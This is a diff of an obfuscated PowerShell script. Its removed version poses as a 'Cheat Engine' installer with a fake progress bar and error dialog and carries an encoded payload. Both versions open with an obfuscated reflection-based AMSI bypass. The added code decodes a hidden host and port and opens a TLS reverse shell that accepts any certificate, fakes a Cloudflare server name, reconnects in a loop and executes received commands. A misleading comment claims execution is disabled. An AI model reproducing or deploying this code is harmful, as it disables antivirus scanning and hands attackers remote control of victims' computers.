@@ -1,83 +1,46 @@
-$VuitbEho2Qbt5NgSQpcj=$null;$C3BUf=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076*968/968));$oc="+[cHaR]([bYTE]0x6b)+[ChAr](118)+[chaR](117*106/106)+[cHaR](121*58/58)+[CHAr]([BYTe]0x75)+[cHAr]([byTE]0x6a)+[ChAR](95+14)+[cHaR](49+60)+[CHAr](116*51/51)+[Char](102*62/62)+[CHar]([Byte]0x73)+[chaR](30+90)+[char]([BYTe]0x72)";[Threading.Thread]::Sleep(647);[Ref].Assembly.GetType("System.$([cHAr](72+5)+[CHAr](95+2)+[cHaR](110)+[ChaR](97)+[Char](103+98-98)+[cHAr](101)+[ChAr](109)+[Char]([bYTE]0x65)+[CHAr](110)+[cHAR](116*79/79)).$([cHAR](55+10)+[chAr]([byte]0x75)+[cHaR](116)+[char]([bYte]0x6f)+[cHAR]([byTE]0x6d)+[ChAR](97+2-2)+[char](116)+[CHaR]([bytE]0x69)+[cHAR]([ByTE]0x6f)+[chAR](110)).$(('Â'+'m'+'s'+'î'+'Ù'+'t'+'ì'+'l'+'s').NORMaLizE([cHAR](70*49/49)+[CHar]([bYte]0x6f)+[char](83+31)+[Char](109*87/87)+[cHar](68*34/34)) -replace [cHaR]([ByTE]0x5c)+[char](112+55-55)+[Char](111+12)+[chAR]([BytE]0x4d)+[CHAR]([byte]0x6e)+[chAr](125*65/65))").GetField("$([ChaR](86+11)+[chaR]([bYtE]0x6d)+[cHAr]([BYTe]0x73)+[chaR]([Byte]0x69)+[cHar](83+20-20)+[ChAR](101)+[chAR]([ByTe]0x73)+[cHaR]([bYtE]0x73)+[CHar](105*75/75)+[CHAr](111+31-31)+[CHAR](110+36-36))", "NonPublic,Static").SetValue($VuitbEho2Qbt5NgSQpcj, $VuitbEho2Qbt5NgSQpcj);[Ref].Assembly.GetType("System.$([cHAr](72+5)+[CHAr](95+2)+[cHaR](110)+[ChaR](97)+[Char](103+98-98)+[cHAr](101)+[ChAr](109)+[Char]([bYTE]0x65)+[CHAr](110)+[cHAR](116*79/79)).$([cHAR](55+10)+[chAr]([byte]0x75)+[cHaR](116)+[char]([bYte]0x6f)+[cHAR]([byTE]0x6d)+[ChAR](97+2-2)+[char](116)+[CHaR]([bytE]0x69)+[cHAR]([ByTE]0x6f)+[chAR](110)).$(('Â'+'m'+'s'+'î'+'Ù'+'t'+'ì'+'l'+'s').NORMaLizE([cHAR](70*49/49)+[CHar]([bYte]0x6f)+[char](83+31)+[Char](109*87/87)+[cHar](68*34/34)) -replace [cHaR]([ByTE]0x5c)+[char](112+55-55)+[Char](111+12)+[chAR]([BytE]0x4d)+[CHAR]([byte]0x6e)+[chAr](125*65/65))").GetField("$([CHAR]([BytE]0x61)+[CHaR](109)+[chAr](32+83)+[CHAR]([bYTE]0x69)+[chaR](58+9)+[ChaR](111*4/4)+[Char]([ByTe]0x6e)+[ChAr]([byTE]0x74)+[CHAr]([byte]0x65)+[ChAR]([BYte]0x78)+[chaR]([BytE]0x74))", "NonPublic,Static").SetValue($VuitbEho2Qbt5NgSQpcj, [IntPtr]$C3BUf);$ptmdroovmxbyopgdroydtbedvjst="+[CHar]([bYtE]0x79)+[chAR]([byTe]0x6b)+[CHAR](105*54/54)+[cHaR]([BYTE]0x71)+[CHAr]([bytE]0x64)+[cHAr](115+73-73)+[cHAR](9+113)+[cHAR]([bYTE]0x7a)";[Threading.Thread]::Sleep(1223)
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
+$P6YRK8Et09QIK=$null;$kjf=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+8631-8631));$amrzwqlqoeubknpmmwzpd="+[ChaR](119*100/100)+[cHAr]([ByTE]0x68)+[cHAR]([ByTE]0x63)+[ChaR]([BYtE]0x70)+[Char]([BYtE]0x71)+[char](117)+[Char]([bYtE]0x75)";[Threading.Thread]::Sleep(256);[Ref].Assembly.GetType("System.$([ChaR](77+2-2)+[chAr](97)+[cHar](110)+[cHAR]([Byte]0x61)+[cHaR](103)+[CHAr](101+78-78)+[CHAR](109*79/79)+[Char](101*8/8)+[Char]([bYTe]0x6e)+[chaR](116)).$([chAr]([BYTE]0x41)+[chAr](20+97)+[cHar](116*19/19)+[cHAR]([bYTE]0x6f)+[CHaR]([bYte]0x6d)+[CHAr](97*63/63)+[Char](116*52/52)+[ChAr](105)+[ChAR](111+21-21)+[chaR]([byTE]0x6e)).$(('Äms'+'îÙt'+'îls').nORmAliZe([ChAR]([byte]0x46)+[cHAr]([BYTE]0x6f)+[ChAr](114*22/22)+[cHar](109)+[chaR]([BYtE]0x44)) -replace [ChaR](92+63-63)+[CHAR](105+7)+[chaR](123+27-27)+[cHar](77+56-56)+[cHar]([byTe]0x6e)+[cHaR]([bYte]0x7d))").GetField("$(('àmsîSés'+'sìôn').nOrmAlIZe([chaR]([BYTe]0x46)+[ChAR](111+6-6)+[cHAr](87+27)+[chaR]([byTE]0x6d)+[cHAr](27+41)) -replace [CHAr](24+68)+[CHAR]([ByTE]0x70)+[ChAr]([byte]0x7b)+[ChAR](77+51-51)+[cHaR](110+40-40)+[CHar](125+119-119))", "NonPublic,Static").SetValue($P6YRK8Et09QIK, $P6YRK8Et09QIK);[Ref].Assembly.GetType("System.$([ChaR](77+2-2)+[chAr](97)+[cHar](110)+[cHAR]([Byte]0x61)+[cHaR](103)+[CHAr](101+78-78)+[CHAR](109*79/79)+[Char](101*8/8)+[Char]([bYTe]0x6e)+[chaR](116)).$([chAr]([BYTE]0x41)+[chAr](20+97)+[cHar](116*19/19)+[cHAR]([bYTE]0x6f)+[CHaR]([bYte]0x6d)+[CHAr](97*63/63)+[Char](116*52/52)+[ChAr](105)+[ChAR](111+21-21)+[chaR]([byTE]0x6e)).$(('Äms'+'îÙt'+'îls').nORmAliZe([ChAR]([byte]0x46)+[cHAr]([BYTE]0x6f)+[ChAr](114*22/22)+[cHar](109)+[chaR]([BYtE]0x44)) -replace [ChaR](92+63-63)+[CHAR](105+7)+[chaR](123+27-27)+[cHar](77+56-56)+[cHar]([byTe]0x6e)+[cHaR]([bYte]0x7d))").GetField("$([chAR](97+62-62)+[cHAr](109+83-83)+[ChaR]([bYte]0x73)+[cHar](105*70/70)+[cHAR]([byTE]0x43)+[cHAr](111)+[cHaR](110+32-32)+[ChAr](116)+[CHAr]([byTE]0x65)+[Char]([BYTE]0x78)+[CHaR](116+91-91))", "NonPublic,Static").SetValue($P6YRK8Et09QIK, [IntPtr]$kjf);$iyjxtzplxhmwrjvaq="+('wjzzpôbãrìäv'+'tä').nORmAlIze([cHar]([BYtE]0x46)+[Char]([byTE]0x6f)+[chAR](114+90-90)+[chAR]([BYTE]0x6d)+[ChAr](68+41-41)) -replace [ChAR]([BYTE]0x5c)+[CHar]([bYtE]0x70)+[chaR]([byTe]0x7b)+[CHAr]([BYtE]0x4d)+[cHar]([Byte]0x6e)+[cHar](125+43-43)";[Threading.Thread]::Sleep(32)
+function Decode-Base64String($b){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b))}
+$WjfIwJ4204206969=Decode-Base64String "MTkyLjE2OC4xNzguMjMNCg=="
+$WurstSandwich420=[int](Decode-Base64String "ODA4MA==")
+$sslProto=[System.Security.Authentication.SslProtocols]::Tls12
 
-$form = New-Object System.Windows.Forms.Form
-$form.Text = "Cheat Engine"
-$form.Size = New-Object System.Drawing.Size(400,150)
-$form.StartPosition = "CenterScreen"
-$form.FormBorderStyle = 'FixedDialog'
-$form.MaximizeBox = $false
-$form.MinimizeBox = $false
+function Write-Stream($sw,$txt){$sw.Write($txt + 'SHELL> ');$sw.Flush()}
 
-$label = New-Object System.Windows.Forms.Label
-$label.Text = "Preparing Cheat Engine..."
-$label.AutoSize = $false
-$label.TextAlign = 'MiddleCenter'
-$label.Dock = 'Top'
-$label.Height = 30
-$form.Controls.Add($label)
+while($true){
+    try{
+        $cli=New-Object Net.Sockets.TCPClient
+        $cli.Connect($WjfIwJ4204206969,$WurstSandwich420)
+        $netStream=$cli.GetStream()
+        $ssl=New-Object Net.Security.SslStream($netStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]))
+        $ssl.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProto,$false)
+        if(-not ($ssl.IsEncrypted -and $ssl.IsSigned)){ $ssl.Close();$cli.Close();Start-Sleep 5;continue }
 
-$progressBar = New-Object System.Windows.Forms.ProgressBar
-$progressBar.Minimum = 0
-$progressBar.Maximum = 100
-$progressBar.Value = 0
-$progressBar.Dock = 'Bottom'
-$progressBar.Height = 30
-$form.Controls.Add($progressBar)
+        $sw=New-Object IO.StreamWriter($ssl)
+        $sw.AutoFlush=$true
+        Write-Stream $sw ''
 
-$form.Show()
+        $buf=New-Object Byte[] 4096
+        while($true){
+            try{
+                $r=$ssl.Read($buf,0,$buf.Length)
+                if($r -le 0){throw "x"}
+                $cmd=([Text.Encoding]::UTF8).GetString($buf,0,$r).Trim()
+                if([string]::IsNullOrEmpty($cmd)){Write-Stream $sw '';continue}
 
-for ($i = 0; $i -le 100; $i++) {
-    $progressBar.Value = $i
-    $label.Text = "Preparing Cheat Engine... $i%"
-    
-    # Fenster "leben lassen"
-    [System.Windows.Forms.Application]::DoEvents()
-    
-    Start-Sleep -Milliseconds 300
+                # Schutz vor direktem IEX mit whitelist (kein automatisches Ausführen)
+                if($cmd -match '^\s*iex\s+'){
+                    $out="Invoke-Expression ist deaktiviert."
+                } else {
+                    try{$out=Invoke-Expression $cmd 2>&1 | Out-String}catch{$out=$_.Exception.Message}
+                }
+                Write-Stream $sw $out
+            }catch{break}
+        }
+
+        $sw.Close()
+        $ssl.Close()
+        $netStream.Close()
+        $cli.Close()
+    }catch{}
+    Start-Sleep 5
 }
-
-[System.Windows.Forms.MessageBox]::Show("Error: Failed to prepare Cheat Engine.","Error","OK","Error")
-
-$form.Close()
-
-
-
-function R1 { Get-Random -Minimum 1 -Maximum 101 }
-function R2 {
-    param([byte[]]$x, [byte[]]$y)
-    $z = New-Object byte[] $x.Length
-    for ($i = 0; $i -lt $x.Length; $i++) {
-        $z[$i] = $x[$i] -bxor $y[$i % $y.Length]
-    }
-    return $z
-}
-$zutat = "JFZ1aXRiRWhvMlFidDVOZ1NRcGNqPSRudWxsOyRDM0JVZj1bU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoKDkwNzYqOTY4Lzk2OCkpOyRvYz0iK1tjSGFSXShbYllURV0weDZiKStbQ2hBcl0oMTE4KStbY2hhUl0oMTE3KjEwNi8xMDYpK1tjSGFSXSgxMjEqNTgvNTgpK1tDSEFyXShbQllUZV0weDc1KStbY0hBcl0oW2J5VEVdMHg2YSkrW0NoQVJdKDk1KzE0KStbY0hhUl0oNDkrNjApK1tDSEFyXSgxMTYqNTEvNTEpK1tDaGFyXSgxMDIqNjIvNjIpK1tDSGFyXShbQnl0ZV0weDczKStbY2hhUl0oMzArOTApK1tjaGFyXShbQllUZV0weDcyKSI7W1RocmVhZGluZy5UaHJlYWRdOjpTbGVlcCg2NDcpO1tSZWZdLkFzc2VtYmx5LkdldFR5cGUoIlN5c3RlbS4kKFtjSEFyXSg3Mis1KStbQ0hBcl0oOTUrMikrW2NIYVJdKDExMCkrW0NoYVJdKDk3KStbQ2hhcl0oMTAzKzk4LTk4KStbY0hBcl0oMTAxKStbQ2hBcl0oMTA5KStbQ2hhcl0oW2JZVEVdMHg2NSkrW0NIQXJdKDExMCkrW2NIQVJdKDExNio3OS83OSkpLiQoW2NIQVJdKDU1KzEwKStbY2hBcl0oW2J5dGVdMHg3NSkrW2NIYVJdKDExNikrW2NoYXJdKFtiWXRlXTB4NmYpK1tjSEFSXShbYnlURV0weDZkKStbQ2hBUl0oOTcrMi0yKStbY2hhcl0oMTE2KStbQ0hhUl0oW2J5dEVdMHg2OSkrW2NIQVJdKFtCeVRFXTB4NmYpK1tjaEFSXSgxMTApKS4kKCgnw4InKydtJysncycrJ8OuJysnw5knKyd0Jysnw6wnKydsJysncycpLk5PUk1hTGl6RShbY0hBUl0oNzAqNDkvNDkpK1tDSGFyXShbYll0ZV0weDZmKStbY2hhcl0oODMrMzEpK1tDaGFyXSgxMDkqODcvODcpK1tjSGFyXSg2OCozNC8zNCkpIC1yZXBsYWNlIFtjSGFSXShbQnlURV0weDVjKStbY2hhcl0oMTEyKzU1LTU1KStbQ2hhcl0oMTExKzEyKStbY2hBUl0oW0J5dEVdMHg0ZCkrW0NIQVJdKFtieXRlXTB4NmUpK1tjaEFyXSgxMjUqNjUvNjUpKSIpLkdldEZpZWxkKCIkKFtDaGFSXSg4NisxMSkrW2NoYVJdKFtiWXRFXTB4NmQpK1tjSEFyXShbQllUZV0weDczKStbY2hhUl0oW0J5dGVdMHg2OSkrW2NIYXJdKDgzKzIwLTIwKStbQ2hBUl0oMTAxKStbY2hBUl0oW0J5VGVdMHg3MykrW2NIYVJdKFtiWXRFXTB4NzMpK1tDSGFyXSgxMDUqNzUvNzUpK1tDSEFyXSgxMTErMzEtMzEpK1tDSEFSXSgxMTArMzYtMzYpKSIsICJOb25QdWJsaWMsU3RhdGljIikuU2V0VmFsdWUoJFZ1aXRiRWhvMlFidDVOZ1NRcGNqLCAkVnVpdGJFaG8yUWJ0NU5nU1FwY2opO1tSZWZdLkFzc2VtYmx5LkdldFR5cGUoIlN5c3RlbS4kKFtjSEFyXSg3Mis1KStbQ0hBcl0oOTUrMikrW2NIYVJdKDExMCkrW0NoYVJdKDk3KStbQ2hhcl0oMTAzKzk4LTk4KStbY0hBcl0oMTAxKStbQ2hBcl0oMTA5KStbQ2hhcl0oW2JZVEVdMHg2NSkrW0NIQXJdKDExMCkrW2NIQVJdKDExNio3OS83OSkpLiQoW2NIQVJdKDU1KzEwKStbY2hBcl0oW2J5dGVdMHg3NSkrW2NIYVJdKDExNikrW2NoYXJdKFtiWXRlXTB4NmYpK1tjSEFSXShbYnlURV0weDZkKStbQ2hBUl0oOTcrMi0yKStbY2hhcl0oMTE2KStbQ0hhUl0oW2J5dEVdMHg2OSkrW2NIQVJdKFtCeVRFXTB4NmYpK1tjaEFSXSgxMTApKS4kKCgnw4InKydtJysncycrJ8OuJysnw5knKyd0Jysnw6wnKydsJysncycpLk5PUk1hTGl6RShbY0hBUl0oNzAqNDkvNDkpK1tDSGFyXShbYll0ZV0weDZmKStbY2hhcl0oODMrMzEpK1tDaGFyXSgxMDkqODcvODcpK1tjSGFyXSg2OCozNC8zNCkpIC1yZXBsYWNlIFtjSGFSXShbQnlURV0weDVjKStbY2hhcl0oMTEyKzU1LTU1KStbQ2hhcl0oMTExKzEyKStbY2hBUl0oW0J5dEVdMHg0ZCkrW0NIQVJdKFtieXRlXTB4NmUpK1tjaEFyXSgxMjUqNjUvNjUpKSIpLkdldEZpZWxkKCIkKFtDSEFSXShbQnl0RV0weDYxKStbQ0hhUl0oMTA5KStbY2hBcl0oMzIrODMpK1tDSEFSXShbYllURV0weDY5KStbY2hhUl0oNTgrOSkrW0NoYVJdKDExMSo0LzQpK1tDaGFyXShbQnlUZV0weDZlKStbQ2hBcl0oW2J5VEVdMHg3NCkrW0NIQXJdKFtieXRlXTB4NjUpK1tDaEFSXShbQll0ZV0weDc4KStbY2hhUl0oW0J5dEVdMHg3NCkpIiwgIk5vblB1YmxpYyxTdGF0aWMiKS5TZXRWYWx1ZSgkVnVpdGJFaG8yUWJ0NU5nU1FwY2osIFtJbnRQdHJdJEMzQlVmKTskcHRtZHJvb3ZteGJ5b3BnZHJveWR0YmVkdmpzdD0iK1tDSGFyXShbYll0RV0weDc5KStbY2hBUl0oW2J5VGVdMHg2YikrW0NIQVJdKDEwNSo1NC81NCkrW2NIYVJdKFtCWVRFXTB4NzEpK1tDSEFyXShbYnl0RV0weDY0KStbY0hBcl0oMTE1KzczLTczKStbY0hBUl0oOSsxMTMpK1tjSEFSXShbYllURV0weDdhKSI7W1RocmVhZGluZy5UaHJlYWRdOjpTbGVlcCgxMjIzKQ0KQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3Jtcw0KQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uRHJhd2luZw0KDQokZm9ybSA9IE5ldy1PYmplY3QgU3lzdGVtLldpbmRvd3MuRm9ybXMuRm9ybQ0KJGZvcm0uVGV4dCA9ICJDaGVhdCBFbmdpbmUiDQokZm9ybS5TaXplID0gTmV3LU9iamVjdCBTeXN0ZW0uRHJhd2luZy5TaXplKDQwMCwxNTApDQokZm9ybS5TdGFydFBvc2l0aW9uID0gIkNlbnRlclNjcmVlbiINCiRmb3JtLkZvcm1Cb3JkZXJTdHlsZSA9ICdGaXhlZERpYWxvZycNCiRmb3JtLk1heGltaXplQm94ID0gJGZhbHNlDQokZm9ybS5NaW5pbWl6ZUJveCA9ICRmYWxzZQ0KDQokbGFiZWwgPSBOZXctT2JqZWN0IFN5c3RlbS5XaW5kb3dzLkZvcm1zLkxhYmVsDQokbGFiZWwuVGV4dCA9ICJQcmVwYXJpbmcgQ2hlYXQgRW5naW5lLi4uIg0KJGxhYmVsLkF1dG9TaXplID0gJGZhbHNlDQokbGFiZWwuVGV4dEFsaWduID0gJ01pZGRsZUNlbnRlcicNCiRsYWJlbC5Eb2NrID0gJ1RvcCcNCiRsYWJlbC5IZWlnaHQgPSAzMA0KJGZvcm0uQ29udHJvbHMuQWRkKCRsYWJlbCkNCg0KJHByb2dyZXNzQmFyID0gTmV3LU9iamVjdCBTeXN0ZW0uV2luZG93cy5Gb3Jtcy5Qcm9ncmVzc0Jhcg0KJHByb2dyZXNzQmFyLk1pbmltdW0gPSAwDQokcHJvZ3Jlc3NCYXIuTWF4aW11bSA9IDEwMA0KJHByb2dyZXNzQmFyLlZhbHVlID0gMA0KJHByb2dyZXNzQmFyLkRvY2sgPSAnQm90dG9tJw0KJHByb2dyZXNzQmFyLkhlaWdodCA9IDMwDQokZm9ybS5Db250cm9scy5BZGQoJHByb2dyZXNzQmFyKQ0KDQokZm9ybS5TaG93KCkNCg0KZm9yICgkaSA9IDA7ICRpIC1sZSAxMDA7ICRpKyspIHsNCiAgICAkcHJvZ3Jlc3NCYXIuVmFsdWUgPSAkaQ0KICAgICRsYWJlbC5UZXh0ID0gIlByZXBhcmluZyBDaGVhdCBFbmdpbmUuLi4gJGklIg0KICAgIA0KICAgICMgRmVuc3RlciAibGViZW4gbGFzc2VuIg0KICAgIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BcHBsaWNhdGlvbl06OkRvRXZlbnRzKCkNCiAgICANCiAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDMwMA0KfQ0KDQpbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveF06OlNob3coIkVycm9yOiBGYWlsZWQgdG8gcHJlcGFyZSBDaGVhdCBFbmdpbmUuIiwiRXJyb3IiLCJPSyIsIkVycm9yIikNCg0KJGZvcm0uQ2xvc2UoKQ0KDQoNCg0KZnVuY3Rpb24gUjEgeyBHZXQtUmFuZG9tIC1NaW5pbXVtIDEgLU1heGltdW0gMTAxIH0NCmZ1bmN0aW9uIFIyIHsNCiAgICBwYXJhbShbYnl0ZVtdXSR4LCBbYnl0ZVtdXSR5KQ0KICAgICR6ID0gTmV3LU9iamVjdCBieXRlW10gJHguTGVuZ3RoDQogICAgZm9yICgkaSA9IDA7ICRpIC1sdCAkeC5MZW5ndGg7ICRpKyspIHsNCiAgICAgICAgJHpbJGldID0gJHhbJGldIC1ieG9yICR5WyRpICUgJHkuTGVuZ3RoXQ0KICAgIH0NCiAgICByZXR1cm4gJHoNCn0NCiR6dXRhdCA9ICJKR1JoZEdWcFRtRnRaU0E5SUNKWGRYSnpkQzVsZUdVaURRb2taR0YwWldsUVptRmtJRDBnU205cGJpMVFZWFJvSUNoSFpYUXRURzlqWVhScGIyNHBJQ1JrWVhSbGFVNWhiV1VOQ21sbUlDaFVaWE4wTFZCaGRHZ2dKR1JoZEdWcFVHWmhaQ2tnZXcwS0lDQWdJRkpsYlc5MlpTMUpkR1Z0SUNSa1lYUmxhVkJtWVdRZ0xVWnZjbU5sRFFwOURRb05DaVJRTmxsU1N6aEZkREE1VVVsTFBTUnVkV3hzT3lScmFtWTlXMU41YzNSbGJTNVNkVzUwYVcxbExrbHVkR1Z5YjNCVFpYSjJhV05sY3k1TllYSnphR0ZzWFRvNlFXeHNiMk5JUjJ4dlltRnNLQ2c1TURjMkt6ZzJNekV0T0RZek1Ta3BPeVJoYlhKNmQzRnNjVzlsZFdKcmJuQnRiWGQ2Y0dROUlpdGJRMmhoVWwwb01URTVLakV3TUM4eE1EQXBLMXRqU0VGeVhTaGJRbmxVUlYwd2VEWTRLU3RiWTBoQlVsMG9XMEo1VkVWZE1IZzJNeWtyVzBOb1lWSmRLRnRDV1hSRlhUQjROekFwSzF0RGFHRnlYU2hiUWxsMFJWMHdlRGN4S1N0YlkyaGhjbDBvTVRFM0tTdGJRMmhoY2wwb1cySlpkRVZkTUhnM05Ta2lPMXRVYUhKbFlXUnBibWN1VkdoeVpXRmtYVG82VTJ4bFpYQW9NalUyS1R0YlVtVm1YUzVCYzNObGJXSnNlUzVIWlhSVWVYQmxLQ0pUZVhOMFpXMHVKQ2hiUTJoaFVsMG9OemNyTWkweUtTdGJZMmhCY2wwb09UY3BLMXRqU0dGeVhTZ3hNVEFwSzF0alNFRlNYU2hiUW5sMFpWMHdlRFl4S1N0YlkwaGhVbDBvTVRBektTdGJRMGhCY2wwb01UQXhLemM0TFRjNEtTdGJRMGhCVWwwb01UQTVLamM1THpjNUtTdGJRMmhoY2wwb01UQXhLamd2T0NrclcwTm9ZWEpkS0Z0aVdWUmxYVEI0Tm1VcEsxdGphR0ZTWFNneE1UWXBLUzRrS0Z0amFFRnlYU2hiUWxsVVJWMHdlRFF4S1N0YlkyaEJjbDBvTWpBck9UY3BLMXRqU0dGeVhTZ3hNVFlxTVRrdk1Ua3BLMXRqU0VGU1hTaGJZbGxVUlYwd2VEWm1LU3RiUTBoaFVsMG9XMkpaZEdWZE1IZzJaQ2tyVzBOSVFYSmRLRGszS2pZekx6WXpLU3RiUTJoaGNsMG9NVEUyS2pVeUx6VXlLU3RiUTJoQmNsMG9NVEExS1N0YlEyaEJVbDBvTVRFeEt6SXhMVEl4S1N0YlkyaGhVbDBvVzJKNVZFVmRNSGcyWlNrcExpUW9LQ2ZEaEcxekp5c253NjdEbVhRbkt5ZkRybXh6SnlrdWJrOVNiVUZzYVZwbEtGdERhRUZTWFNoYllubDBaVjB3ZURRMktTdGJZMGhCY2wwb1cwSlpWRVZkTUhnMlppa3JXME5vUVhKZEtERXhOQ295TWk4eU1pa3JXMk5JWVhKZEtERXdPU2tyVzJOb1lWSmRLRnRDV1hSRlhUQjRORFFwS1NBdGNtVndiR0ZqWlNCYlEyaGhVbDBvT1RJck5qTXROak1wSzF0RFNFRlNYU2d4TURVck55a3JXMk5vWVZKZEtERXlNeXN5TnkweU55a3JXMk5JWVhKZEtEYzNLelUyTFRVMktTdGJZMGhoY2wwb1cySjVWR1ZkTUhnMlpTa3JXMk5JWVZKZEtGdGlXWFJsWFRCNE4yUXBLU0lwTGtkbGRFWnBaV3hrS0NJa0tDZ253NkJ0YzhPdVU4T3BjeWNySjNQRHJNTzBiaWNwTG01UGNtMUJiRWxhWlNoYlkyaGhVbDBvVzBKWlZHVmRNSGcwTmlrclcwTm9RVkpkS0RFeE1TczJMVFlwSzF0alNFRnlYU2c0TnlzeU55a3JXMk5vWVZKZEtGdGllVlJGWFRCNE5tUXBLMXRqU0VGeVhTZ3lOeXMwTVNrcElDMXlaWEJzWVdObElGdERTRUZ5WFNneU5DczJPQ2tyVzBOSVFWSmRLRnRDZVZSRlhUQjROekFwSzF0RGFFRnlYU2hiWW5sMFpWMHdlRGRpS1N0YlEyaEJVbDBvTnpjck5URXROVEVwSzF0alNHRlNYU2d4TVRBck5EQXROREFwSzF0RFNHRnlYU2d4TWpVck1URTVMVEV4T1NrcElpd2dJazV2YmxCMVlteHBZeXhUZEdGMGFXTWlLUzVUWlhSV1lXeDFaU2drVURaWlVrczRSWFF3T1ZGSlN5d2dKRkEyV1ZKTE9FVjBNRGxSU1VzcE8xdFNaV1pkTGtGemMyVnRZbXg1TGtkbGRGUjVjR1VvSWxONWMzUmxiUzRrS0Z0RGFHRlNYU2czTnlzeUxUSXBLMXRqYUVGeVhTZzVOeWtyVzJOSVlYSmRLREV4TUNrclcyTklRVkpkS0Z0Q2VYUmxYVEI0TmpFcEsxdGpTR0ZTWFNneE1ETXBLMXREU0VGeVhTZ3hNREVyTnpndE56Z3BLMXREU0VGU1hTZ3hNRGtxTnprdk56a3BLMXREYUdGeVhTZ3hNREVxT0M4NEtTdGJRMmhoY2wwb1cySlpWR1ZkTUhnMlpTa3JXMk5vWVZKZEtERXhOaWtwTGlRb1cyTm9RWEpkS0Z0Q1dWUkZYVEI0TkRFcEsxdGphRUZ5WFNneU1DczVOeWtyVzJOSVlYSmRLREV4TmlveE9TOHhPU2tyVzJOSVFWSmRLRnRpV1ZSRlhUQjRObVlwSzF0RFNHRlNYU2hiWWxsMFpWMHdlRFprS1N0YlEwaEJjbDBvT1RjcU5qTXZOak1wSzF0RGFHRnlYU2d4TVRZcU5USXZOVElwSzF0RGFFRnlYU2d4TURVcEsxdERhRUZTWFNneE1URXJNakV0TWpFcEsxdGphR0ZTWFNoYllubFVSVjB3ZURabEtTa3VKQ2dvSjhPRWJYTW5LeWZEcnNPWmRDY3JKOE91YkhNbktTNXVUMUp0UVd4cFdtVW9XME5vUVZKZEtGdGllWFJsWFRCNE5EWXBLMXRqU0VGeVhTaGJRbGxVUlYwd2VEWm1LU3RiUTJoQmNsMG9NVEUwS2pJeUx6SXlLU3RiWTBoaGNsMG9NVEE1S1N0YlkyaGhVbDBvVzBKWmRFVmRNSGcwTkNrcElDMXlaWEJzWVdObElGdERhR0ZTWFNnNU1pczJNeTAyTXlrclcwTklRVkpkS0RFd05TczNLU3RiWTJoaFVsMG9NVEl6S3pJM0xUSTNLU3RiWTBoaGNsMG9OemNyTlRZdE5UWXBLMXRqU0dGeVhTaGJZbmxVWlYwd2VEWmxLU3RiWTBoaFVsMG9XMkpaZEdWZE1IZzNaQ2twSWlrdVIyVjBSbWxsYkdRb0lpUW9XMk5vUVZKZEtEazNLell5TFRZeUtTdGJZMGhCY2wwb01UQTVLemd6TFRnektTdGJRMmhoVWwwb1cySlpkR1ZkTUhnM015a3JXMk5JWVhKZEtERXdOU28zTUM4M01Da3JXMk5JUVZKZEtGdGllVlJGWFRCNE5ETXBLMXRqU0VGeVhTZ3hNVEVwSzF0alNHRlNYU2d4TVRBck16SXRNeklwSzF0RGFFRnlYU2d4TVRZcEsxdERTRUZ5WFNoYllubFVSVjB3ZURZMUtTdGJRMmhoY2wwb1cwSlpWRVZkTUhnM09Da3JXME5JWVZKZEtERXhOaXM1TVMwNU1Ta3BJaXdnSWs1dmJsQjFZbXhwWXl4VGRHRjBhV01pS1M1VFpYUldZV3gxWlNna1VEWlpVa3M0UlhRd09WRkpTeXdnVzBsdWRGQjBjbDBrYTJwbUtUc2thWGxxZUhSNmNHeDRhRzEzY21wMllYRTlJaXNvSjNkcWVucHd3N1JpdzZOeXc2ekRwSFluS3lkMHc2UW5LUzV1VDFKdFFXeEplbVVvVzJOSVlYSmRLRnRDV1hSRlhUQjRORFlwSzF0RGFHRnlYU2hiWW5sVVJWMHdlRFptS1N0YlkyaEJVbDBvTVRFMEt6a3dMVGt3S1N0YlkyaEJVbDBvVzBKWlZFVmRNSGcyWkNrclcwTm9RWEpkS0RZNEt6UXhMVFF4S1NrZ0xYSmxjR3hoWTJVZ1cwTm9RVkpkS0Z0Q1dWUkZYVEI0TldNcEsxdERTR0Z5WFNoYllsbDBSVjB3ZURjd0tTdGJZMmhoVWwwb1cySjVWR1ZkTUhnM1lpa3JXME5JUVhKZEtGdENXWFJGWFRCNE5HUXBLMXRqU0dGeVhTaGJRbmwwWlYwd2VEWmxLU3RiWTBoaGNsMG9NVEkxS3pRekxUUXpLU0k3VzFSb2NtVmhaR2x1Wnk1VWFISmxZV1JkT2pwVGJHVmxjQ2d6TWlrTkNtWjFibU4wYVc5dUlFUmxZMjlrWlMxQ1lYTmxOalJUZEhKcGJtY29KR0lwZTF0VVpYaDBMa1Z1WTI5a2FXNW5YVG82VlZSR09DNUhaWFJUZEhKcGJtY29XME52Ym5abGNuUmRPanBHY205dFFtRnpaVFkwVTNSeWFXNW5LQ1JpS1NsOURRb2tWMnBtU1hkS05ESXdOREl3TmprMk9UMUVaV052WkdVdFFtRnpaVFkwVTNSeWFXNW5JQ0pOVkd0NVRHcEZNazlETkhoT2VtZDFUV3BOVGtOblBUMGlEUW9rVjNWeWMzUlRZVzVrZDJsamFEUXlNRDFiYVc1MFhTaEVaV052WkdVdFFtRnpaVFkwVTNSeWFXNW5JQ0pQUkVFMFRVRTlQU0lwRFFva2MzTnNVSEp2ZEc4OVcxTjVjM1JsYlM1VFpXTjFjbWwwZVM1QmRYUm9aVzUwYVdOaGRHbHZiaTVUYzJ4UWNtOTBiMk52YkhOZE9qcFViSE14TWcwS0RRcG1kVzVqZEdsdmJpQlhjbWwwWlMxVGRISmxZVzBvSkhOM0xDUjBlSFFwZXlSemR5NVhjbWwwWlNna2RIaDBJQ3NnSjFOSVJVeE1QaUFuS1Rza2MzY3VSbXgxYzJnb0tYME5DZzBLZDJocGJHVW9KSFJ5ZFdVcGV3MEtJQ0FnSUhSeWVYc05DaUFnSUNBZ0lDQWdKR05zYVQxT1